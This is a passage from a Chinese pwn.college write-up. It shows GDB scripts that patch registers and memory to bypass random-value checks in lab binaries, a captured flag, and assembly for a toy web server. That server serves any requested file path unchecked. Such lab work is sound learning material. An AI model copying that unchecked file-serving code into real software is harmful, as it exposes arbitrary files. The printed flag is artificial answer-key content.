<p>**PS：**在后续的学习中，发现可以使用x&#x2F;gx 以8字节为单位输出</p>
<h4 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h4><p>我也不知道是不是我第三关的方法用错了，第四关就是使用第三关的方法，一直重复，一直读取read系统调用时<code>rsi</code>寄存器的那个地址，并且在<code>scanf</code>系统调用前打个断点，这样方便我们读取这个随机值。重复5次还是几次就能拿到flag了。</p>
<h4 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h4><p>使用gdb脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">start</span><br><span class="line">break *main+704</span><br><span class="line">commands</span><br><span class="line">    set $rsi_buf = $rsi</span><br><span class="line">    printf &quot;buf_addr value: %llx\n&quot;, $rsi_buf</span><br><span class="line">end</span><br><span class="line">break *main+752</span><br><span class="line">commands</span><br><span class="line">    set $local_variable = *(unsigned long long*)($rsi_buf)</span><br><span class="line">    printf &quot;Random value: %llx\n&quot;, $local_variable</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>呃，这个脚本不是完全的自动化，但是手动复制输入给程序，重复几次后就能获得到flag了。但是实际上应该是可以做到自动化输入的，或许可以借助python脚本来写，或者直接改内存。</p>
<h4 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h4><p>改寄存器的值做不到哇，<code>scanf</code>函数是通过调用多次<code>read</code>系统调用，每次都只写入<strong>1个字节</strong></p>
<p>我麻了，尝试那么多次。实际上应该跳过scanf,而不是重定向标准输入。只需要获取scanf所读取的内存地址，在这个地址将那个随机值放进去，然后控制<code>rip</code>寄存器，跳过scanf就好了。用一下exp会出现一个问题：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">run</span><br><span class="line">break *main+572</span><br><span class="line">commands</span><br><span class="line">    silent</span><br><span class="line">    set $rsi_buf = $rsi</span><br><span class="line">    printf &quot;buf_addr value: %llx\n&quot;, $rsi_buf</span><br><span class="line">    continue</span><br><span class="line">end</span><br><span class="line">break *main+606</span><br><span class="line">commands</span><br><span class="line">    silent</span><br><span class="line">    set $local_variable = *(uint64_t*)($rsi_buf)</span><br><span class="line">    printf &quot;Random value: %llx\n&quot;, $local_variable</span><br><span class="line">    set $rbp</span><br><span class="line">    set $rip=$rip + 0x18</span><br><span class="line">    continue</span><br><span class="line">end</span><br><span class="line">break *main+637</span><br><span class="line">commands</span><br><span class="line">    ptype $rsi</span><br><span class="line">    ptype $local_variable</span><br><span class="line">    set $rsi=$local_variable</span><br><span class="line">    info registers</span><br><span class="line">    continue</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<img src="/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20241030201710671.png" class="" title="image-20241030201710671">

<p>我仅仅修改了printf的内存，导致它输出的内容是一致的，但是后续的cmp指令所比较的，还是取的<code>rbp-0x18</code>地址的内容，这个内容我并没有修改，所以认定为不匹配。我直接修改<code>rbp-0x18</code>地址的内容为这个随机值即可。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">run</span><br><span class="line">break *main+572</span><br><span class="line">commands</span><br><span class="line">    silent</span><br><span class="line">    set $rsi_buf = $rsi</span><br><span class="line">    continue</span><br><span class="line">end</span><br><span class="line">break *main+606</span><br><span class="line">commands</span><br><span class="line">    silent</span><br><span class="line">    set $local_variable = *(uint64_t*)($rsi_buf)</span><br><span class="line">    set $rbp</span><br><span class="line">    set $rip=$rip + 0x18</span><br><span class="line">    continue</span><br><span class="line">end</span><br><span class="line">break *main+630</span><br><span class="line">commands</span><br><span class="line">    silent</span><br><span class="line">    set *(uint64_t*)($rbp-0x10) = $local_variable</span><br><span class="line">    continue</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>OK，自动化成功！</p>
<h4 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(gdb) call (void)win()</span><br><span class="line">You win! Here is your flag:</span><br><span class="line">pwn.college&#123;kS6uX4HwFALgoHPYfILQokDmQwX.0FM1IDLxYTN1YzW&#125;</span><br></pre></td></tr></table></figure>

<p>gdb直接可以调用函数，其实在前面的关卡，我看到有个win函数，就修改过rip寄存器跳到win函数，直接能够获取flag。不过还是一步步做收获大些。毕竟这flag啥也不是</p>
<h4 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h4><p>因为程序是被损坏了，但是我认为<code>open</code>,<code>read</code>等系统调用应该都挺重要的，所以直接jump过去执行，单步执行来到<code>write</code>后就拿到flag了。</p>
<p>入口是从<code>win+47</code>位置开始的。</p>
<h3 id="Building-a-Web-Server"><a href="#Building-a-Web-Server" class="headerlink" title="Building a Web Server"></a>Building a Web Server</h3><h4 id="level1-1"><a href="#level1-1" class="headerlink" title="level1"></a>level1</h4><p>正常的exit汇编</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">.section .text</span><br><span class="line">_start:</span><br><span class="line">    mov rdi,0</span><br><span class="line">    mov rax,60</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">.section .data</span><br></pre></td></tr></table></figure>



<h4 id="level2-1"><a href="#level2-1" class="headerlink" title="level2"></a>level2</h4><p>要实现socket，其系统调用为41。原型<code>int socket(int domain, int type, int protocol);</code></p>
<p><code>socket(AF_INET, SOCK_STREAM,IPPROTO_IP)=3</code></p>
<p>也就是说，domain为<code>AF_INET</code>，type为<code>SOCK_STREAM</code>，protocol为<code>IPPROTO_IP</code></p>
<p>其中，关于第一个参数说明如下：</p>
<ul>
<li><strong><code>AF_INET</code> (2):</strong> IPv4 地址族。</li>
<li><strong><code>AF_INET6</code> (10):</strong> IPv6 地址族。</li>
<li><strong><code>AF_UNIX</code> (1):</strong> Unix 套接字。 这些套接字用于进程间通信，通常在本地主机上使用。 它们不是基于网络的。</li>
<li><strong><code>AF_BLUETOOTH</code> (12):</strong> 用于蓝牙通信的套接字类型。</li>
<li><strong><code>AF_PACKET</code> (17):</strong> 允许应用程序访问底层网络帧。</li>
<li><strong><code>AF_NETLINK</code> (16):</strong> 用于内核模块和用户空间进程之间的消息传递。</li>
<li><strong><code>AF_AX25</code> (11):</strong> 用于 AX.25 协议的套接字类型。</li>
<li><strong><code>AF_X25</code> (15):</strong> 用于 X.25 协议的套接字类型。</li>
<li><strong><code>AF_ATMPVC</code> (21):</strong> 用于 ATM (Asynchronous Transfer Mode) 协议的虚拟通道 (PVC)。</li>
<li><strong><code>AF_APPLETALK</code> (23):</strong> 用于 AppleTalk 协议的套接字类型。</li>
<li><strong><code>AF_NETBIOS</code> (24):</strong> 用于 NetBIOS 协议的套接字类型。</li>
</ul>
<p>关于第二个参数说明如下：</p>
<ul>
<li><strong><code>SOCK_STREAM</code> (1):</strong> 面向连接的流式套接字。数据被可靠地传输，以字节流的形式发送，顺序保证。 这类似于 TCP。</li>
<li><strong><code>SOCK_DGRAM</code> (2):</strong> 无连接的数据报套接字。数据包可能会丢失或顺序颠倒。 这类似于 UDP。 数据被发送成独立的数据报，没有可靠性保证。</li>
<li><strong><code>SOCK_SEQPACKET</code> (3):</strong> 面向连接的序列包套接字。它试图提供 TCP 的可靠性但不需要三次握手，在某些情况下性能更好。 这种类型比较少见。</li>
<li><strong><code>SOCK_RAW</code> (3):</strong> 原始套接字。允许应用程序访问底层网络协议。程序员可以访问网络协议的详细信息，控制传输的整个过程。这需要对网络协议有深入的了解，使用风险比较高。</li>
</ul>
<p>关于第三个参数说明如下：</p>
<ul>
<li><strong><code>IPPROTO_IP</code> (0):</strong> IP 协议。 这个值通常在使用 TCP 或 UDP 时使用，因为它在底层协议栈中就已经存在了。 它不是一个独立的协议，而是 IP 协议栈的一部分。</li>
<li><strong><code>IPPROTO_TCP</code> (6):</strong> 传输控制协议 (TCP)。 这指定了使用 TCP 协议。</li>
<li><strong><code>IPPROTO_UDP</code> (17):</strong> 用户数据报协议 (UDP)。 这指定了使用 UDP 协议。</li>
<li><strong><code>IPPROTO_ICMP</code> (1):</strong> 因特网控制消息协议 (ICMP)。 ICMP 用于错误报告和查询。</li>
<li><strong><code>IPPROTO_IGMP</code> (2):</strong> 因特网组管理协议 (IGMP)。 IGMP 用于多播。</li>
<li><strong><code>IPPROTO_IPIP</code> (4):</strong> IP over IP。 这允许一个 IP 数据报封装在另一个 IP 数据报中。</li>
<li><strong><code>IPPROTO_RSVP</code> (46):</strong> 资源预留协议 (RSVP)。 用于保证多媒体应用程序的带宽。</li>
<li><strong><code>IPPROTO_GRE</code> (47):</strong> 通用路由封装 (GRE)。 允许将不同协议的数据包封装在 IP 数据报中。</li>
<li><strong><code>IPPROTO_AH</code> (51):</strong> 认证头 (AH)。 用于安全通信。</li>
</ul>
<p>那么最终的exp为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">.section .text</span><br><span class="line">_start:</span><br><span class="line">    mov rax, 41      # socket(AF_INET, SOCK_STREAM,IPPROTO_IP)=3</span><br><span class="line">    mov rdi, 2		# AF_INET(2)</span><br><span class="line">    mov rsi, 1		# SOCK_STREAM(1)</span><br><span class="line">    mov rdx, 0		# IPPROTO_IP(0)</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi,0       # SYS_exit</span><br><span class="line">    mov rax,60</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="level3-1"><a href="#level3-1" class="headerlink" title="level3"></a>level3</h4><p>实现bind，<code>bind(3, &#123;sa_family=AF_INET, sin_port=htons(&lt;bind_port&gt;), sin_addr=inet_addr(&quot;&lt;bind_address&gt;&quot;)&#125;, 16) = 0</code></p>
<p>bind原型：<code>int bind(int sockfd, const struct sockaddr addr, socklen_t addrlen)</code></p>
<p>好吧，我想不出来。看别人的wp，很好，用到了.data段定义这个结构体。然后端口是0x5000，是80的小端序</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">.section .text</span><br><span class="line">_start:     </span><br><span class="line">    mov rdi, 2      # socket(AF_INET, SOCK_STREAM,IPPROTO_IP)=3</span><br><span class="line">    mov rsi, 1</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 41 </span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 3</span><br><span class="line">    lea rsi, [rip+socket_addr]</span><br><span class="line">    mov rdx, 16</span><br><span class="line">    mov rax, 49</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi,0       # SYS_exit</span><br><span class="line">    mov rax,60</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line">socket_addr:</span><br><span class="line">    .2byte 2</span><br><span class="line">    .2byte 0x5000</span><br><span class="line">    .4byte 0</span><br><span class="line">    .8byte 0</span><br></pre></td></tr></table></figure>

<p>绑定的地址为0.0.0.0即<code>bind(3, &#123;sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr(&quot;0.0.0.0&quot;)&#125;, 16) = 0</code></p>
<h4 id="level4-1"><a href="#level4-1" class="headerlink" title="level4"></a>level4</h4><p>要完成<code>listen(3, 0) = 0</code>，这个简单啊，listen系统调用号为50</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">.section .text</span><br><span class="line">_start:     </span><br><span class="line">    mov rdi, 2      # socket(AF_INET, SOCK_STREAM,IPPROTO_IP)=3</span><br><span class="line">    mov rsi, 1</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 41 </span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 3      # bind(3, &#123;sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr(&quot;0.0.0.0&quot;)&#125;, 16) = 0</span><br><span class="line">    lea rsi, [rip+socket_addr]</span><br><span class="line">    mov rdx, 16</span><br><span class="line">    mov rax, 49</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 3      # listen(3, 0) = 0</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rax, 50</span><br><span class="line">    syscall </span><br><span class="line"></span><br><span class="line">    mov rdi,0       # SYS_exit</span><br><span class="line">    mov rax,60</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line">socket_addr:</span><br><span class="line">    .2byte 2</span><br><span class="line">    .2byte 0x5000</span><br><span class="line">    .4byte 0</span><br><span class="line">    .8byte 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="level5-1"><a href="#level5-1" class="headerlink" title="level5"></a>level5</h4><p>要完成<code>accept(3, NULL, NULL) = 4</code> accept的系统调用号为43</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">.section .text</span><br><span class="line">_start:     </span><br><span class="line">    mov rdi, 2      # socket(AF_INET, SOCK_STREAM,IPPROTO_IP)=3</span><br><span class="line">    mov rsi, 1</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 41 </span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 3      # bind(3, &#123;sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr(&quot;0.0.0.0&quot;)&#125;, 16) = 0</span><br><span class="line">    lea rsi, [rip+socket_addr]</span><br><span class="line">    mov rdx, 16</span><br><span class="line">    mov rax, 49</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 3      # listen(3, 0) = 0</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rax, 50</span><br><span class="line">    syscall </span><br><span class="line"></span><br><span class="line">    mov rdi, 3      # accept(3, NULL, NULL) = 4</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 43</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi,0       # SYS_exit</span><br><span class="line">    mov rax,60</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line">socket_addr:</span><br><span class="line">    .2byte 2</span><br><span class="line">    .2byte 0x5000</span><br><span class="line">    .4byte 0</span><br><span class="line">    .8byte 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="level6-1"><a href="#level6-1" class="headerlink" title="level6"></a>level6</h4><p>这一关有点东西，要完成三个东西：<code>read(4, &lt;read_request&gt;, &lt;read_request_count&gt;) = &lt;read_request_result&gt;</code>，<code>write(4, &quot;HTTP/1.0 200 OK\r\n\r\n&quot;, 19) = 19</code>和<code>close(4) = 0</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">.section .text</span><br><span class="line">_start:     </span><br><span class="line">    mov rdi, 2      # socket(AF_INET, SOCK_STREAM,IPPROTO_IP)=3</span><br><span class="line">    mov rsi, 1</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 41 </span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 3      # bind(3, &#123;sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr(&quot;0.0.0.0&quot;)&#125;, 16) = 0</span><br><span class="line">    lea rsi, [rip+socket_addr]</span><br><span class="line">    mov rdx, 16</span><br><span class="line">    mov rax, 49</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 3      # listen(3, 0) = 0</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rax, 50</span><br><span class="line">    syscall </span><br><span class="line"></span><br><span class="line">    mov rdi, 3      # accept(3, NULL, NULL) = 4</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 43</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 4</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    mov rdx, 256</span><br><span class="line">    mov rax, 0</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 4      # write(4, &quot;HTTP/1.0 200 OK\r\n\r\n&quot;, 19) = 19</span><br><span class="line">    lea rsi,[rip + ret_normal_msg] </span><br><span class="line">    mov rdx, 19</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 4      # close(4) = 0</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi,0       # SYS_exit</span><br><span class="line">    mov rax,60</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line">socket_addr:</span><br><span class="line">    .2byte 2</span><br><span class="line">    .2byte 0x5000</span><br><span class="line">    .4byte 0</span><br><span class="line">    .8byte 0</span><br><span class="line">ret_normal_msg:</span><br><span class="line">    .ascii &quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这一关的目的是，能够接收客户端发送来的消息，并反馈200状态码。</p>
<h4 id="level7-1"><a href="#level7-1" class="headerlink" title="level7"></a>level7</h4><p>那么这一关，就响应客户端的请求，将它要的文件，发送给它。那么就有个问题了，第一个read会读取客户端发来的请求，然后这个请求很长，该怎么精准拿到这个文件呢？</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(4, &quot;GET /tmp/tmpper_iarh HTTP/1.1\r\nHost: localhost\r\nUser-Agent: python-requests/2.32.3\r\nAccept-Encoding: gzip, deflate, zstd\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n&quot;, 256) = 161</span><br></pre></td></tr></table></figure>

<img src="/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20241031112813128.png" class="" title="image-20241031112813128">

<p>我发现了一个简单的方法用变量存起来就好了，然后截断第一个空格。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line">_start:     </span><br><span class="line">    mov rdi, 2      # socket(AF_INET, SOCK_STREAM,IPPROTO_IP)=3</span><br><span class="line">    mov rsi, 1</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 41 </span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 3      # bind(3, &#123;sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr(&quot;0.0.0.0&quot;)&#125;, 16) = 0</span><br><span class="line">    lea rsi, [rip+socket_addr]</span><br><span class="line">    mov rdx, 16</span><br><span class="line">    mov rax, 49</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 3      # listen(3, 0) = 0</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rax, 50</span><br><span class="line">    syscall </span><br><span class="line"></span><br><span class="line">    mov rdi, 3      # accept(3, NULL, NULL) = 4</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 43</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 4      # read(4,buf,count_bytes)</span><br><span class="line">    lea rsi, buffer</span><br><span class="line">    mov rdx, 256</span><br><span class="line">    mov rax, 0</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    lea rsi, buffer+4</span><br><span class="line">    lea rdi, file_path</span><br><span class="line">loop_start:</span><br><span class="line">    mov al, byte ptr [rsi]</span><br><span class="line">    cmp al, &#x27; &#x27;</span><br><span class="line">    je get_file_path</span><br><span class="line">    mov byte ptr [rdi], al</span><br><span class="line">    inc rdi</span><br><span class="line">    inc rsi</span><br><span class="line">    jmp loop_start</span><br><span class="line"></span><br><span class="line">get_file_path:</span><br><span class="line">    lea rdi, file_path # open</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rax, 2</span><br><span class="line">    syscall</span><br><span class="line">    </span><br><span class="line">    mov rdi, 5              # read</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    mov rdx, 256</span><br><span class="line">    mov rax, 0</span><br><span class="line">    syscall </span><br><span class="line">    mov r8, rax</span><br><span class="line"></span><br><span class="line">    mov rax, 0</span><br><span class="line">    mov rbx, 0</span><br><span class="line"></span><br><span class="line">    mov rdi, 5</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 4      # write(4, &quot;HTTP/1.0 200 OK\r\n\r\n&quot;, 19) = 19</span><br><span class="line">    lea rsi,[rip + ret_normal_msg] </span><br><span class="line">    mov rdx, 19</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 4</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    mov rdx, r8</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 4      # close(4) = 0</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi,0       # SYS_exit</span><br><span class="line">    mov rax,60</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line">socket_addr:</span><br><span class="line">    .2byte 2</span><br><span class="line">    .2byte 0x5000</span><br><span class="line">    .4byte 0</span><br><span class="line">    .8byte 0</span><br><span class="line">ret_normal_msg:</span><br><span class="line">    .ascii &quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span><br><span class="line">buffer:</span><br><span class="line">    .space 256</span><br><span class="line">file_path:</span><br><span class="line">    .space 64 </span><br><span class="line"></span><br></pre></td></tr></table></figure>



